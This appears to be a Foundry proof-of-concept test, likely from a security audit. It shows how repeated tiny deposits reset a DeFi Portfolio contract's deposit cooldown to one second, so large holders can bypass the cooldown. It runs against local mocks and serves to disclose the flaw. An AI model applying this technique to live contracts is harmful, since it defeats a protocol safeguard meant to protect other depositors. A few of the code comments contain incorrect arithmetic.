// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import "../../contracts/core/Portfolio.sol";
import "../../contracts/core/management/VaultManager.sol";
import "../../contracts/core/cooldown/CooldownManager.sol";
import "../../contracts/config/protocol/SystemSettings.sol";
import "../../contracts/config/protocol/ProtocolConfig.sol";
import "../../contracts/config/assetManagement/AssetManagementConfig.sol";
import "../../contracts/fee/FeeModule.sol";
import "../../contracts/FunctionParameters.sol";
import "../../contracts/vault/IVelvetSafeModule.sol";
import "../../contracts/core/interfaces/IBorrowManager.sol";
import "../../contracts/access/IAccessController.sol";
import "../../contracts/core/interfaces/ITokenExclusionManager.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts-upgradeable-4.9.6/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

/**
 * @title MockToken
 * @notice A simple ERC20 token for testing purposes
 */
contract MockToken is ERC20 {
    uint8 private _decimals;

    constructor(
        string memory name,
        string memory symbol,
        uint8 decimals_
    ) ERC20(name, symbol) {
        _decimals = decimals_;
        _mint(msg.sender, 2_000_000_000_000_000_000_000 * 10 ** decimals_);
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }
}

/**
 * @title MockVelvetSafeModule
 * @notice A mock implementation of the VelvetSafeModule for testing
 */
contract MockVelvetSafeModule {
    function executeWallet(
        address target,
        bytes memory data
    ) external returns (bool, bytes memory) {
        return (true, "");
    }

    function transferModuleOwnership(address newOwner) external {}

    function setUp(bytes memory initializeParams) external {}
}

/**
 * @title MockBorrowManager
 * @notice A mock implementation of the BorrowManager for testing
 */
contract MockBorrowManager {
    function initialize(address _protocolConfig) external {}

    function repayBorrow(
        uint256 _portfolioTokenAmount,
        uint256 _totalSupply,
        FunctionParameters.withdrawRepayParams calldata _repayData
    ) external {}

    function init(
        address _protocolConfig,
        address _accessController,
        address _portfolio
    ) external {}

    function repayVault(
        uint256 _portfolioTokenAmount,
        uint256 _totalSupply,
        FunctionParameters.withdrawRepayParams calldata _repayData
    ) external {}
}

/**
 * @title MockAccessController
 * @notice A mock implementation of the AccessController for testing
 */
contract MockAccessController {
    function initialize() external {}

    function hasRole(
        bytes32 role,
        address account
    ) external pure returns (bool) {
        return true;
    }

    function grantRole(bytes32 role, address account) external {}

    function revokeRole(bytes32 role, address account) external {}

    function renounceRole(bytes32 role, address account) external {}
}

/**
 * @title MockTokenExclusionManager
 * @notice A mock implementation of the TokenExclusionManager for testing
 */
contract MockTokenExclusionManager {
    function initialize() external {}

    function setUserRecord(address _user, uint256 _userBalance) external {}

    function getUserExclusionTokens(
        address _user
    ) external view returns (address[] memory) {
        return new address[](0);
    }

    function init(address _accessController, address _portfolio) external {}

    function snapshot() external returns (uint256) {
        return 0;
    }

    function setTokenAndSupplyRecord(
        address _token,
        uint256 _supply
    ) external {}

    function getDataAtId(uint256 _id) external view returns (address[] memory) {
        return new address[](0);
    }

    function userRecord(address _user) external view returns (uint256) {
        return 0;
    }

    function deployTokenRemovalVault() external returns (address) {
        return address(0);
    }

    function removedToken(address _token, uint256 _supply) external {}
}

/**
 * @title MockSystemSettings
 * @notice A mock implementation of SystemSettings that calls the internal initialization function
 */
contract MockSystemSettings is SystemSettings {
    function initialize() external initializer {
        __SystemSettings_init();
    }

    function _isOwner() internal override returns (bool) {
        return true;
    }

    function _owner() internal override returns (address) {
        return msg.sender;
    }
}

/**
 * @title MockProtocolConfig
 * @notice A mock implementation of ProtocolConfig that calls the internal initialization function
 */

/**
 * @title MockAssetManagementConfig
 * @notice A simplified mock implementation of AssetManagementConfig for testing
 */
contract MockAssetManagementConfig {
    uint256 private _initialPortfolioAmount;

    function initialize() external {}

    function setInitialPortfolioAmount(uint256 amount) external {
        _initialPortfolioAmount = amount;
    }

    function initialPortfolioAmount() external view returns (uint256) {
        return _initialPortfolioAmount;
    }

    function publicPortfolio() external view returns (bool) {
        return true;
    }

    function transferable() external view returns (bool) {
        return true;
    }

    function transferableToPublic() external view returns (bool) {
        return true;
    }

    function assetManagerTreasury() external view returns (address) {
        return address(20);
    }

    function minPortfolioTokenHoldingAmount() external view returns (uint256) {
        return 1;
    }

    function tokenWhitelistingEnabled() external view returns (bool) {
        return true;
    }

    function isTokenWhitelisted(address _token) external view returns (bool) {
        return true;
    }
    function entryFee() external view returns (uint256) {
        return 0;
    }

    function managementFee() external view returns (uint256) {
        return 0;
    }
}

/**
 * @title MockFeeModule
 * @notice A simplified mock implementation of FeeModule for testing
 */
contract MockFeeModule {
    function initialize(address _protocolConfig) external {}

    function resetHighWaterMark() external {}

    function chargeProtocolAndManagementFeesProtocol()
        external
        view
        returns (bool)
    {
        return false;
    }
}

/**
 * @title DepositCooldownPOC
 * @notice A POC test that demonstrates the deposit workflow with a cooldown period
 * @dev This test follows these steps:
 *      1. Deploy Portfolio contract
 *      2. Deposit tokens via depositAndMint
 *      3. Let the cooldown period pass
 *      4. Let the same user do another deposit
 */
contract DepositCooldownPOC is Test {
    // Mock tokens for testing
    MockToken public usdc;
    MockToken public weth;
    MockToken public wbtc;

    // Proxy admin for managing upgradeable contracts
    ProxyAdmin public proxyAdmin;

    // Portfolio and related contracts
    Portfolio public portfolioImplementation;
    Portfolio public portfolio;

    SystemSettings public systemSettings;
    ProtocolConfig public protocolConfig;
    AssetManagementConfig public assetManagementConfig;
    FeeModule public feeModule;
    MockVelvetSafeModule public safeModule;
    MockBorrowManager public borrowManager;
    MockAccessController public accessController;
    MockTokenExclusionManager public tokenExclusionManager;

    address vault;

    // Test user
    address public user = address(0x1);
    address public userB = makeAddr("userB");

    // Cooldown period (in seconds)
    uint256 public cooldownPeriod = 10000; // 2.7 hrs as cooldown period

    // Initial token amounts
    uint256 public constant INITIAL_TOKEN_AMOUNT = 10000 * 10 ** 6; // 10,000 USDC

    function setUp() public {
        // Deploy mock tokens
        usdc = new MockToken("USD Coin", "USDC", 6);
        weth = new MockToken("Wrapped Ether", "WETH", 18);
        wbtc = new MockToken("Wrapped Bitcoin", "WBTC", 8);

        // Setup test user with tokens
        vm.startPrank(address(this));
        usdc.transfer(user, 1_000_000_000_000_000 * 10 ** 6);
        usdc.transfer(userB, 1_000_000_000_000_000 * 10 ** 6);

        vm.stopPrank();

        // Deploy all the necessary contracts for the portfolio
        deployProtocolContracts();

        // Deploy and initialize the portfolio
        deployPortfolio();
    }

    function deployProtocolContracts() internal {
        // Deploy ProxyAdmin for managing upgradeable contracts
        proxyAdmin = new ProxyAdmin();

        // Deploy system settings with a 1-day cooldown period as a proxy
        MockSystemSettings systemSettingsImplementation = new MockSystemSettings();

        // Create a proxy for the system settings
        TransparentUpgradeableProxy systemSettingsProxy = new TransparentUpgradeableProxy(
                address(systemSettingsImplementation),
                address(proxyAdmin), // admin
                "" // data
            );

        // Cast the proxy to SystemSettings and initialize it
        MockSystemSettings mockSystemSettings = MockSystemSettings(
            address(systemSettingsProxy)
        );
        mockSystemSettings.initialize();
        systemSettings = SystemSettings(address(mockSystemSettings));
        systemSettings.setCoolDownPeriod(cooldownPeriod);

        // Deploy protocol config as a proxy
        ProtocolConfig protocolConfigImplementation = new ProtocolConfig();

        // Create a proxy for the protocol config
        TransparentUpgradeableProxy protocolConfigProxy = new TransparentUpgradeableProxy(
                address(protocolConfigImplementation),
                address(proxyAdmin), // admin
                "" // data
            );

        // Cast the proxy to ProtocolConfig
        ProtocolConfig mockProtocolConfig = ProtocolConfig(
            address(protocolConfigProxy)
        );

        // Create mock addresses for required parameters
        address mockTreasury = address(0x123);
        address mockOracle = address(0x456);
        address mockPositionWrapper = address(0x789);

        mockProtocolConfig.initialize(
            mockTreasury,
            mockOracle,
            mockPositionWrapper
        );
        protocolConfig = ProtocolConfig(address(mockProtocolConfig));

        // Deploy mock asset management config as a proxy
        MockAssetManagementConfig assetManagementConfigImplementation = new MockAssetManagementConfig();

        // Create a proxy for the asset management config
        TransparentUpgradeableProxy assetManagementConfigProxy = new TransparentUpgradeableProxy(
                address(assetManagementConfigImplementation),
                address(proxyAdmin), // admin
                "" // data
            );

        // Cast the proxy to AssetManagementConfig and initialize it
        MockAssetManagementConfig mockAssetManagementConfig = MockAssetManagementConfig(
                address(assetManagementConfigProxy)
            );
        mockAssetManagementConfig.initialize();
        mockAssetManagementConfig.setInitialPortfolioAmount(1000 * 10 ** 18); // Initial portfolio amount
        // Cast to the correct type
        assetManagementConfig = AssetManagementConfig(
            address(mockAssetManagementConfig)
        );

        // Deploy mock fee module as a proxy
        MockFeeModule feeModuleImplementation = new MockFeeModule();

        // Create a proxy for the fee module
        TransparentUpgradeableProxy feeModuleProxy = new TransparentUpgradeableProxy(
                address(feeModuleImplementation),
                address(proxyAdmin), // admin
                "" // data
            );

        // Cast the proxy to FeeModule and initialize it
        MockFeeModule mockFeeModule = MockFeeModule(address(feeModuleProxy));
        mockFeeModule.initialize(address(protocolConfig));
        // Cast to the correct type
        feeModule = FeeModule(address(mockFeeModule));

        // Deploy mock contracts
        safeModule = new MockVelvetSafeModule();
        borrowManager = new MockBorrowManager();
        borrowManager.initialize(address(protocolConfig));
        accessController = new MockAccessController();
        accessController.initialize();
        tokenExclusionManager = new MockTokenExclusionManager();
        tokenExclusionManager.initialize();

        // Deploy vault
        vault = makeAddr("vault");
    }

    function deployPortfolio() internal {
        // Deploy portfolio implementation
        portfolioImplementation = new Portfolio();

        // Create a proxy for the portfolio
        TransparentUpgradeableProxy proxy = new TransparentUpgradeableProxy(
            address(portfolioImplementation),
            address(proxyAdmin), // admin
            "" // data
        );

        // Cast the proxy to Portfolio
        portfolio = Portfolio(address(proxy));

        // Initialize the portfolio with all dependencies
        FunctionParameters.PortfolioInitData
            memory initData = FunctionParameters.PortfolioInitData({
                _name: "Test Portfolio",
                _symbol: "TPORT",
                _vault: address(vault),
                _module: address(safeModule),
                _protocolConfig: address(protocolConfig),
                _assetManagementConfig: address(assetManagementConfig),
                _feeModule: address(feeModule),
                _borrowManager: address(borrowManager),
                _accessController: address(accessController),
                _tokenExclusionManager: address(tokenExclusionManager)
            });

        portfolio.init(initData);

        // Add tokens to the vault
        address[] memory tokens = new address[](1);
        tokens[0] = address(usdc);

        // Set up the vault with tokens and weights
        portfolio.initToken(tokens);

        console.log("Portfolio deployed at:", address(portfolio));
    }

    function testDepositWithCooldown() public {
        // 1. First deposit
        console.log("Step 1: First deposit");
        vm.startPrank(user);

        // Approve tokens for deposit
        usdc.approve(address(portfolio), type(uint).max);

        // Prepare deposit amounts
        uint256[] memory depositAmounts = new uint256[](1);
        depositAmounts[0] = 10_000_000_000; // 10k USDC amount
        // depositAmounts[1] = 5 * 10**18; // 5 WETH
        // depositAmounts[2] = 0.5 * 10**8; // 0.5 WBTC

        portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        console.log(
            "First deposit successful, cooldown period:",
            portfolio.userCooldownPeriod(user)
        );
        uint256 totalUserDeposits = usdc.balanceOf(portfolio.vault());
        console.log(
            "Total user usdc tokens nowdeposited in vault",
            totalUserDeposits / 1e6
        );

        // Record the deposit time
        uint256 firstDepositTime = block.timestamp;
        console.log("First deposit timestamp:", firstDepositTime);

        // Wait for cooldown period
        vm.warp(firstDepositTime + 1 days);

        console.log("After cooldown period");

        // Approve more tokens
        usdc.approve(address(portfolio), type(uint).max);

        // Prepare second deposit amounts
        depositAmounts[0] = 100_000;

        // Perform 2000 deposits
        for (uint256 index = 0; index < 2000; index++) {
            portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        } //for loop deposits 10,000 * 2000 = 200 usdc tokens
        console.log("second deposit successful");

        for (uint256 index = 0; index < 2000; index++) {
            portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        } //for loop deposits 10,000 * 2000 = 200 usdc tokens
        console.log("third deposit successful");

        for (uint256 index = 0; index < 2000; index++) {
            portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        } //for loop deposits 10,000 * 2000 = 200 usdc tokens
        console.log("4th deposit successful");

        for (uint256 index = 0; index < 2000; index++) {
            portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        } //for loop deposits 10,000 * 2000 = 200 usdc tokens
        console.log("5th deposit successful");

        for (uint256 index = 0; index < 2000; index++) {
            portfolio.multiTokenDepositFor(user, depositAmounts, 0); // 0 as minMintAmount for simplicity
        } //for loop deposits 10,000 * 2000 = 200 usdc tokens
        console.log("6th deposit successful");

        assertEq(portfolio.userCooldownPeriod(user), 1);
        console.log(
            "assert statement sucessfull means literally no cooldown (1 sec cooldown) for a sizeable deposit of 1k because deposit is done by a user with sizeable liquidity"
        );

        //so easy way for whales or anyone with sizeable liquidity to bypass cooldown mechanism forever

        // user can do this 10 times and deposit more than 2k usdc with literally no cooldown (1 sec cooldown) because user just waits till next second and funds are free.

        totalUserDeposits = usdc.balanceOf(portfolio.vault());

        console.log(
            "Total user usdc tokens nowdeposited in vault",
            totalUserDeposits / 1e6
        );

        console.log(portfolio.balanceOf(user));

        vm.warp(block.timestamp + 1);
        portfolio.transfer(userB, 1000);
        console.log(portfolio.balanceOf(userB));
        vm.stopPrank();

        vm.startPrank(userB);
        usdc.approve(address(portfolio), type(uint).max);
        portfolio.multiTokenDepositFor(userB, depositAmounts, 0);
    }
}
